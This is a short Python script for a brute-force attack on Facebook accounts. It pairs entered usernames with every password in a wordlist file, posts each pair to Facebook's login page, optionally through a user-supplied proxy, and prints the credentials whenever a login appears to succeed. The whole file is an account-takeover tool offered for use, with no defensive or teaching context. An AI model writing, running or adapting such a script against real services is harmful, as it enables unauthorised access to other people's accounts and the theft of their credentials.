import requests
from itertools import product

# Function to generate all possible combinations of username and password
def generate_combinations(username_list, password_list):
    return product(username_list, password_list)

# Function to perform the brute force attack
def brute_force_facebook(username_list, password_list, use_custom_proxy, num_accounts):
    combinations = generate_combinations(username_list, password_list)
    
    for username, password in combinations:
        if use_custom_proxy:
            # Prompt the user for the custom proxy
            custom_proxy = input("Enter the custom proxy in the format 'ip:port': ")
            proxies = {
                'http': custom_proxy,
                'https': custom_proxy
            }
        else:
            proxies = None
        
        try:
            # Send the POST request to Facebook login page
            data = {
                'email': username,
                'pass': password
            }
            response = requests.post('https://www.facebook.com/login.php', data=data, proxies=proxies)
            
            # Check if the login was successful
            if 'Log Out' in response.text:
                print(f"Successful login with username: {username} and password: {password}")
                num_accounts -= 1
                if num_accounts == 0:
                    break
        except:
            print("Failed to connect to proxy.")
            continue

# Main program
if __name__ == '__main__':
    # Prompt the user for the path to the password list
    password_list_path = input("Enter the path to the password list file: ")
    
    # Read the password list from the file
    with open(password_list_path, 'r') as file:
        password_list = file.read().splitlines()
    
    # Prompt the user for the number of accounts to try at once
    num_accounts = int(input("Enter the number of accounts to try at once: "))
    
    # Generate the list of usernames
    username_list = []
    for i in range(num_accounts):
        username = input(f"Enter username for account {i+1}: ")
        username_list.append(username)
    
    # Prompt the user for using custom proxy or not
    use_custom_proxy = input("Do you want to use a custom proxy? (y/n): ").lower() == 'y'
    
    # Perform the brute force attack
    brute_force_facebook(username_list, password_list, use_custom_proxy, num_accounts)